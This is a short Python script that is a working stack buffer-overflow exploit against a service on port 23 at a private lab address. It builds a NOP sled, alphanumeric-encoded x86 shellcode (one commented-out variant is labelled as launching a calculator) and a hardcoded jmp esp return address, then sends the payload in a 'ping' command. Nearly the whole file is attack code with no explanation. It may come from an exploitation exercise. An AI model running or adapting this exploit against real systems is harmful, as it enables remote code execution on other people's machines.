import socket
def send(code,host='192.168.56.1', port=23):
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host, port))
    data = b'ping ' + code + b'\r\n'
    sock.send(data)
    sock.recv(1000)

# # shellcode( open your local compute software)
# shellcode = b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30" + \
# b"\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42" + \
# b"\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34" + \
# b"\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e" + \
# b"\x49\x54\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c" + \
# b"\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48\x4f\x45\x46\x42" + \
# b"\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50" + \
# b"\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37" + \
# b"\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48" + \
# b"\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58" + \
# b"\x42\x4c\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f" + \
# b"\x47\x4e\x43\x56\x41\x46\x4e\x36\x43\x46\x42\x30\x5a"

shellcode = b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x48\x4e\x57\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x38\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x43\x4b\x48\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x30\x4b\x44\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x58\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x47\x4e\x50\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x37\x4e\x41\x4d\x4a\x4b\x58\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b\x42\x30\x42\x30\x42\x50\x4b\x38\x4a\x46\x4e\x33\x4f\x35\x41\x43\x48\x4f\x42\x56\x48\x35\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x37\x42\x45\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x4d\x56\x46\x56\x50\x52\x45\x36\x4a\x57\x45\x56\x42\x42\x4f\x32\x43\x46\x42\x52\x50\x56\x45\x46\x46\x57\x42\x42\x45\x57\x43\x37\x45\x36\x44\x57\x42\x32\x50\x46\x42\x43\x42\x53\x44\x56\x42\x42\x50\x36\x42\x53\x42\x43\x44\x36\x42\x42\x4f\x32\x41\x54\x46\x44\x46\x44\x42\x42\x48\x32\x48\x52\x42\x52\x50\x36\x45\x56\x46\x47\x42\x52\x4e\x56\x4f\x36\x43\x36\x41\x56\x4e\x56\x47\x56\x44\x57\x4f\x56\x45\x47\x42\x37\x42\x42\x41\x54\x46\x46\x4d\x56\x49\x46\x50\x56\x49\x46\x43\x57\x46\x57\x44\x37\x41\x56\x46\x37\x4f\x36\x44\x57\x43\x47\x42\x42\x50\x46\x42\x43\x42\x33\x44\x46\x42\x42\x4f\x52\x41\x44\x46\x44\x46\x44\x42\x30\x5a"

# jmp esp return address
RET_addr = bytes.fromhex('7ffa4512')[::-1]
attackcode = ((b"\x90" *4 + shellcode).ljust(1012, b"\x90") + RET_addr).ljust(2000, b"\x90")
print(shellcode)
send(attackcode)

